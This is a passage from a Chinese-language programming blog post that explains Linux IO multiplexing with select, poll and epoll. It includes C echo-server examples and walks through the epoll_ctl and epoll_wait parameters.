AF_INET;</span><br><span class="line">addr.sin_port = htons(PORT);</span><br><span class="line">addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 绑定socket和addr */</span></span><br><span class="line">res = bind(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;lfd绑定失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 在lfd上监听,数组大小设置为128 */</span></span><br><span class="line">listen(lfd, NR_CLIENTS);</span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;监听失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建文件描述符位图(集合) */</span></span><br><span class="line">fd_set read_set; <span class="comment">/* 1024位,128字节*/</span></span><br><span class="line"><span class="comment">/* 清零read_set */</span></span><br><span class="line">FD_ZERO(&amp;read_set);</span><br><span class="line"><span class="comment">/* 将lfd对应标志位设置为1 */</span></span><br><span class="line">FD_SET(lfd, &amp;read_set);</span><br><span class="line"></span><br><span class="line">fd_set write_set; <span class="comment">/* 写集合 */</span></span><br><span class="line">fd_set except_set; <span class="comment">/* 异常集合 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">time</span>;</span> <span class="comment">/* select()的最后一个参数的结构体 */</span></span><br><span class="line">time.tv_sec = <span class="number">0</span>;</span><br><span class="line">time.tv_usec = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span>* <span class="title">timeval</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* max_fd */</span></span><br><span class="line"><span class="type">int</span> mfd = lfd;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">fd_set temp_set = read_set;</span><br><span class="line"><span class="type">int</span> res = select(NFDS(mfd), &amp;temp_set, &amp;write_set, &amp;except_set, timeval);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cad</span>;</span></span><br><span class="line"><span class="type">socklen_t</span> cadlen = <span class="keyword">sizeof</span>(cad);</span><br><span class="line"><span class="built_in">memset</span>(&amp;cad, <span class="number">0</span>, <span class="keyword">sizeof</span>(cad));</span><br><span class="line"><span class="type">char</span> cip[<span class="number">32</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cport;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 判断lfd读缓冲区是否有数据 */</span></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(lfd, &amp;temp_set)) &#123;</span><br><span class="line"><span class="type">int</span> cfd = accept(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line">FD_SET(cfd, &amp;read_set); <span class="comment">/* 将cfd对应标志位设置为1 */</span></span><br><span class="line">mfd = cfd &gt; mfd ? cfd : mfd; <span class="comment">/* 每次更新最大的fd */</span></span><br><span class="line">inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">cport = ntohs(cad.sin_port);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;与客户端[%s:%d]连接成功\n&quot;</span>, cip, cport);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> fd = <span class="number">0</span>; fd &lt; NFDS(mfd); fd++) &#123;</span><br><span class="line"><span class="comment">/* 不是lfd且fd读缓冲区内有数据 */</span></span><br><span class="line"><span class="keyword">if</span> (fd != lfd &amp;&amp; FD_ISSET(fd, &amp;temp_set)) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取客户端地址 */</span></span><br><span class="line">res = getpeername(fd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="type">char</span> error[MSGSIZE];</span><br><span class="line"><span class="built_in">sprintf</span>(error, <span class="string">&quot;fd:%d获取客户端地址失败&quot;</span>, fd);</span><br><span class="line">perror(error);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 设置客户端ip和port */</span></span><br><span class="line">inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">cport = ntohs(cad.sin_port);</span><br><span class="line"><span class="comment">/* 接收数据 */</span></span><br><span class="line"><span class="type">int</span> len = recv(fd, buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (len == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="type">char</span> error[MSGSIZE];</span><br><span class="line"><span class="built_in">sprintf</span>(error, <span class="string">&quot;与客户端[%s:%d]接收数据失败&quot;</span>, cip, cport);</span><br><span class="line">perror(error);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="type">char</span> message[MSGSIZE];</span><br><span class="line"><span class="built_in">sprintf</span>(message, <span class="string">&quot;与客户端[%s:%d]断开连接\n&quot;</span>, cip, cport);</span><br><span class="line"><span class="built_in">printf</span>(message);</span><br><span class="line">FD_CLR(fd, &amp;read_set);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;客户端[%s:%d]: %s&quot;</span>, cip, cport, buf);</span><br><span class="line"><span class="comment">/* 转换成大写字母 */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">buf[i] &amp;= <span class="number">0xdf</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 发送数据 */</span></span><br><span class="line">res = send(fd, buf, len, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="type">char</span> error[MSGSIZE];</span><br><span class="line"><span class="built_in">sprintf</span>(error, <span class="string">&quot;向客户端[%s:%d]发送数据失败&quot;</span>, cip, cport);</span><br><span class="line">perror(error);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close (lfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，<code>select</code>函数是将传入参数当传出参数来用，也就是说它会修改原来的参数。<code>read_set</code>是我们用来记录有效<code>fd</code>的所以不能被传进去轻易的被修改，所以需要创建一个它的拷贝副本<code>temp_set</code>传进去，然后从这个临时变量中读取想要的数据。</p><p>用<code>select</code>实现的<strong>IO多路复用</strong>核心思想就是操作系统提供一个函数给你，你把要遍历的文件描述符统一交给操作系统，操作系统会统一检查这些文件描述符的缓冲区里有没有数据(这里以读缓冲区为例)，再把缓冲区中有数据的文件描述符筛选出来返回给你。这样我们只需要遍历这些确定有数据的文件描述符调用<code>read()</code>来读取数据就可以了，不需要像原来一样把所有文件描述都调用一遍<code>read()</code>，造成当前线程的在某个文件描述符上堵塞，以及避免一些切换到内核区所需要的资源开销的浪费。</p><p><a href="https://subingwen.cn/linux/select/">IO多路转接（复用）之select | 爱编程的大丙 (subingwen.cn)</a></p><hr><p><code>poll</code>和<code>select</code>的原理差不多，都是由操作系统统一检查文件描述符的缓冲区，返回就绪的文件描述符，避免用户调用<code>read()</code>造成的当前进程的阻塞和切换到内核去的资源开销浪费。</p><p>但是和<code>select</code>不同的是，<code>select</code>操作的是位图，而<code>poll</code>会针对每一个<code>pollfd</code>数组内元素预留的<code>events</code>来根据文件描述符读写缓冲区的实际情况设置对应的<code>revents</code>来表示函数返回的结果。</p><p>出于跨平台和效率的考虑，一般不会选择<code>poll</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="comment">// 每个委托poll检测的fd都对应这样一个结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>   fd;         <span class="comment">/* 委托内核检测的文件描述符 */</span></span><br><span class="line">    <span class="type">short</span> events;     <span class="comment">/* 委托内核检测文件描述符的什么事件 */</span></span><br><span class="line">    <span class="type">short</span> revents;    <span class="comment">/* 文件描述符实际发生的事件 -&gt; 传出 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">myfd</span>[100];</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span>;</span><br><span class="line"><span class="comment">/* 传进去pollfd的数组、数组内有效fd的个数、超时时间(单位为毫秒) */</span></span><br><span class="line"><span class="comment">/* timeout设置为-1函数就会一直阻塞 */</span></span><br></pre></td></tr></table></figure><p><a href="https://subingwen.cn/linux/poll/">IO多路转接（复用）之poll | 爱编程的大丙 (subingwen.cn)</a></p><hr><p><strong>epoll(eventpoll)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">epoll_create</span><span class="params">(<span class="type">int</span> size)</span>;</span><br></pre></td></tr></table></figure><p>这个函数会创建一个<code>epoll树</code>或者说一个<code>epoll</code>实例，因为一个进程中可以不止创建一个<code>epoll</code>实例，所以这个函数会返回一个整数用于标识此次创建的<code>epoll</code>实例。这个整数其实就是一个文件描述符，这个标识某个<code>epoll</code>实例的文件描述符也会在当前进程的文件描述符表中占据一个位置。所以在不使用某个<code>epoll</code>实例后需要<code>close(epfd)</code>来归还文件描述符，释放资源。</p><ul><li>函数参数 size：在Linux内核2.6.8版本以后，这个参数是被忽略的，只需要指定一个大于0的数值就可以了。</li><li>函数返回值：<ul><li>失败：返回-1</li><li>成功：返回一个有效的文件描述符，通过这个文件描述符就可以访问创建的<code>epoll</code>实例了</li></ul></li></ul><p><code>epoll</code>的实例本质上是一颗红黑树。树节点的具体实现是<code>struct epitem</code>，源码有些复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rbn</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">llink</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_filefd</span> <span class="title">ffd</span>;</span> <span class="comment">/* fd存储在这里面 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> *<span class="title">ep</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">rdllink</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span> <span class="comment">/* event,注意是结构体不是结构体指针 */</span></span><br><span class="line">    u64 data;</span><br><span class="line">    u64 data1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是可供用户操作成员变量就是<code>fd</code>和<code>event</code>。或者说这个结构体的重点就是这两个，干脆抽象成这两个好了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|      fd      |</span><br><span class="line">+--------------+</span><br><span class="line">|     event    |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>fd</code>，是文件描述符，也就是个整数，没什么好说的，<code>event</code>的具体实现如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     events;      <span class="comment">/* Epoll events */</span></span><br><span class="line"><span class="type">epoll_data_t</span> data;        <span class="comment">/* User data variable */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* events标注这个节点的事件是读事件还是写事件,分别对应操作系统是检查这个fd的读缓冲区还是写缓冲区 */</span></span><br><span class="line"><span class="comment">/* data相当于是这个节点的事件是一个备注,因为epoll_wait()函数传出的是结构体struct epoll_event,光凭这个无法判断这个事件是哪个fd的,所以在事件envent里除了标明属性还需要打上备注 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 联合体, 多个变量共用同一块内存   </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">epoll_data</span> &#123;</span></span><br><span class="line"> <span class="type">void</span>        *ptr;</span><br><span class="line"><span class="type">int</span>          fd;<span class="comment">// 通常情况下使用这个成员, 和epoll_ctl的第三个参数相同即可</span></span><br><span class="line"><span class="type">uint32_t</span>     u32;</span><br><span class="line"><span class="type">uint64_t</span>     u64;</span><br><span class="line">&#125; <span class="type">epoll_data_t</span>;</span><br></pre></td></tr></table></figure><p><code>epoll_ctl()</code>函数的作用是管理红黑树实例上的节点，可以进行添加、删除、修改操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span>;</span><br></pre></td></tr></table></figure><p>函数参数：</p><ul><li><code>epfd</code>：<code>epoll_create()</code> 函数的返回值，通过这个参数找到<code>epoll</code>实例</li><li><code>op</code>：这是一个枚举值，控制通过该函数执行什么操作<ul><li><code>EPOLL_CTL_ADD</code>：往<code>epoll</code>模型中添加新的节点</li><li><code>EPOLL_CTL_MOD</code>：修改<code>epoll</code>模型中已经存在的节点</li><li><code>EPOLL_CTL_DEL</code>：删除<code>epoll</code>模型中的指定的节点</li></ul></li><li><code>fd</code>：文件描述符，即要添加&#x2F;修改&#x2F;删除的文件描述符</li><li><code>event</code>：<code>epoll</code>事件，用来修饰第三个参数对应的文件描述符的，指定检测这个文件描述符的什么事件<ul><li><code>events</code>：委托<code>epoll</code>检测的事件<ul><li><code>EPOLLIN</code>：读事件, 接收数据, 检测读缓冲区，如果有数据该文件描述符就绪</li><li><code>EPOLLOUT</code>：写事件, 发送数据, 检测写缓冲区，如果可写该文件描述符就绪</li><li><code>EPOLLERR</code>：异常事件</li></ul></li><li><code>data</code>：用户数据变量，这是一个联合体类型，通常情况下使用里边的fd成员，用于存储待检测的文件描述符的值，在调用<code>epoll_wait()</code>函数的时候这个值会被传出。</li></ul></li><li>函数返回值：<br>  失败：返回<code>-1</code><br>  成功：返回<code>0</code></li></ul><p>需要注意的是，用<code>epoll_ctl()</code>函数做添加操作的时候，虽然传进去的事件是以指针的方式传进去的，但是真正创建节点，设置节点的<code>event</code>时采用的是拷贝的方式，源码是下面这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">epi-&gt;event = *event; <span class="comment">/* epi即epoll-item */</span></span><br></pre></td></tr></table></figure><p>所以会看到下面的代码只会定义一个<code>event</code>当作公共变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event * events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure><p>函数参数：</p><ul><li><code>epfd</code>：e<code>poll_create()</code> 函数的返回值, 通过这个参数找到epoll实例</li><li><code>events</code>：传出参数, 这是一个结构体数组的地址, 里边存储了已就绪的文件描述符的信息</li><li><code>maxevents</code>：修饰第二个参数, 结构体数组的容量（元素个数）</li><li><code>timeout</code>：如果检测的epoll实例中没有已就绪的文件描述符，该函数阻塞的时长, 单位ms 毫秒<ul><li>0：函数不阻塞，不管epoll实例中有没有就绪的文件描述符，函数被调用后都直接返回</li><li>大于0：如果epoll实例中没有已就绪的文件描述符，函数阻塞对应的毫秒数再返回</li><li>-1：函数一直阻塞，直到epoll实例中有已就绪的文件描述符之后才解除阻塞</li></ul></li><li>函数返回值：<ul><li>成功：<ul><li>等于0：函数是阻塞被强制解除了, 没有检测到满足条件的文件描述符</li><li>大于0：检测到的已就绪的文件描述符的总个数</li></ul></li><li>失败：返回-1</li></ul></li></ul><p><a href="https://subingwen.cn/linux/epoll/">IO多路转接（复用）之epoll | 爱编程的大丙 (subingwen.cn)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_CLIENTS 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPOLL 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EVSSIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSGSIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> PORT = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置服务器本地地址 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(PORT);</span><br><span class="line">    addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建lfd作为监听socket */</span></span><br><span class="line">    <span class="type">int</span> lfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (lfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 绑定addr到lfd上 */</span></span><br><span class="line">    res = bind(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd绑定失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 开始在lfd上监听,数组大小设置为128 */</span></span><br><span class="line">    res = listen(lfd, NR_CLIENTS);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd监听失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建一个epoll树 */</span></span><br><span class="line">    <span class="type">int</span> epoll = epoll_create(EPOLL);</span><br><span class="line">    <span class="keyword">if</span> (epoll == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建公共变量 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">EVSSIZE</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cad</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> cadlen = <span class="keyword">sizeof</span>(cad);</span><br><span class="line">    <span class="type">char</span> cip[<span class="number">32</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cport;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 添加lfd到epoll中 */</span></span><br><span class="line">    event.events = EPOLLIN;</span><br><span class="line">    event.data.fd = lfd;</span><br><span class="line">    epoll_ctl(epoll, EPOLL_CTL_ADD, lfd, &amp;event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> event_count = epoll_wait(epoll, events, EVSSIZE, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; event_count; i++) &#123;</span><br><span class="line">            <span class="type">int</span> fd = events[i].data.fd;</span><br><span class="line">            <span class="keyword">if</span> (fd == lfd) &#123;</span><br><span class="line">                <span class="type">int</span> cfd = accept(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line">                <span class="comment">/* 设置事件和添加cfd到epoll上 */</span></span><br><span class="line">                event.events = EPOLLIN;</span><br><span class="line">                event.data.fd = cfd;</span><br><span class="line">                epoll_ctl(epoll, EPOLL_CTL_ADD, cfd, &amp;event);</span><br><span class="line">                inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">    cport = ntohs(cad.sin_port);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;与客户端[%s:%d]连接成功\n&quot;</span>, cip, cport);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">                <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf)); </span><br><span class="line">                <span class="comment">/* 获取客户端地址 */</span></span><br><span class="line">                res = getpeername(fd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line">                <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="type">char</span> error[MSGSIZE];</span><br><span class="line">                    <span class="built_in">sprintf</span>(error, <span class="string">&quot;fd:%d获取客户端地址失败&quot;</span>, fd);</span><br><span class="line">                    perror(error);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* 设置客户端ip和port */</span></span><br><span class="line">                inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">                cport = ntohs(cad.sin_port);</span><br><span class="line">                <span class="comment">/* 接收数据 */</span></span><br><span class="line"><span class="type">int</span> len = recv(fd, buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>, <span class="number">0</span>);  </span><br><span class="line">                <span class="keyword">if</span> (len == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="type">char</span> error[MSGSIZE];</span><br><span class="line">                    <span class="built_in">sprintf</span>(error, <span class="string">&quot;与客户端[%s:%d]接收数据失败&quot;</span>, cip, cport);</span><br><span class="line">                    perror(error);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">char</span> message[MSGSIZE];</span><br><span class="line">                    <span class="built_in">sprintf</span>(message, <span class="string">&quot;与客户端[%s:%d]断开连接\n&quot;</span>, cip, cport);</span><br><span class="line">                    <span class="built_in">printf</span>(message);</span><br><span class="line">                    epoll_ctl(epoll, EPOLL_CTL_DEL, fd, <span 